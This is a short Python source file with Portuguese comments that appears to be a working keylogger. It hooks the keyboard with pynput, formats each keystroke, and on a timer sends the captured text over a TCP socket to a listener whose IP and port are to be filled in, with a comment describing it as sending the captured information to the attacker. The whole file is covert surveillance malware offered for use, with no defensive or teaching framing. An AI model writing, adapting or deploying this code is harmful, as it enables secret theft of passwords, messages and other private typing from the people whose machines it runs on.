from pynput.keyboard import Listener
from threading import Thread
import time
import socket

# ====================================================================================================
# Comunica tudo o que é digitado para o listener


s = socket.socket()
# Insira o IP e a porta do listener abaixo
s.connect(('127.0.0.1', 4444))

# =====================================================================================================
# Formata e organiza tudo o que é digitado
digitado = ''

def monitor(tecla):
    global digitado
    tecla = str(tecla)
    # Formata a tecla caso seja uma letra ou número
    if "'" in tecla:
        tecla = tecla.replace("'", '')
    
    # Caso não seja uma letra ou número, formata a tecla especial com base em seu efeito no texto
    else:
        tecla = tecla.replace(tecla[:4], '')
        tradutor = {'space':' ', '<96>':'0', '<97>':'1', '<98>':'2', '<99>':'3', '<100>':'4', '<101>':'5', '<102>':'6', '<103>':'7', '<104>':'8', '<105>':'9'}
        if tecla in tradutor:
            tecla = tradutor[tecla]
        elif tecla == 'backspace':
            digitado = digitado[:-1]
            return
        else:
            try:
                tecla = f" [{tecla[0].upper()}{tecla[1:]}] "
            except:
                tecla = ' [Algum do numpad] '

    # Adiciona a tecla formatada á lista caso a entrada seja [Enter]
    digitado += tecla


# ======================================================================================================
# Envia as informações capturadas para o atacante
while True:
    with Listener(on_press=monitor) as ls:
        def time_out(minutos: int):
            time.sleep(60 * minutos)  # Listen to keyboard for period_sec seconds
            ls.stop()
            s.send(bytes(digitado, 'utf-8'))
            

        Thread(target=time_out, args=(0.1,)).start()
        digitado = ''
        ls.join()
